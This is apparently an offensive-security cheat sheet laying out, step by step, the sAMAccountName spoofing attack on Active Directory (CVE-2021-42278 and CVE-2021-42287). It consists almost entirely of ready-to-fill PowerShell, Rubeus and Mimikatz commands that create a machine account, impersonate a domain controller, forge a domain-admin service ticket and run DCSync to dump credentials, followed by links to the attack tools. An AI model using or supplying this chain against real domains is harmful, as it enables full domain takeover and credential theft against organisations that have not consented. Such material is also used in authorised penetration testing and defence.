# sAMAccountName spoofing

# add computer account
New-MachineAccount -MachineAccount <newComputer> -Password $(ConvertTo-SecureString '<newPassword>' -AsPlainText -Force)

# set serviceprincipalname to empty value
Set-DomainObject -Identity <newComputer> -Clear serviceprincipalname

# change sAMAccountName to Domain Controllers name without trailing $
Set-MachineAccountAttribute -MachineAccount "<newComputer>" -Value "<dcNo$>" -Attribute samaccountname -Verbose

# request a TGT for new computer account
Rubeus.exe asktgt /user:"<dcNo$>" /password:"<newPassword>" /domain:"<domain>" /dc:"<fqdnDc>" /nowrap

# reset the controlled machine account sAMAccountName to its old value
Set-MachineAccountAttribute -MachineAccount "dcNo$" -Value "<newComputer>" -Attribute samaccountname -Verbose

# obtain a service ticket with S4U2self by presenting the previous TGT
Rubeus.exe s4u /self /impersonateuser:"<domainAdmin>" /altservice:"cifs/<fqdnDc>" /dc:"<fqdnDc>" /ptt /ticket:<base64>

# dcsync
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /kdc:<fqdnDc> /user:<targetUser>"'

# References
https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
https://www.cvedetails.com/cve/CVE-2021-42278
https://www.cvedetails.com/cve/CVE-2021-42287
https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Recon/PowerView.ps1
https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1

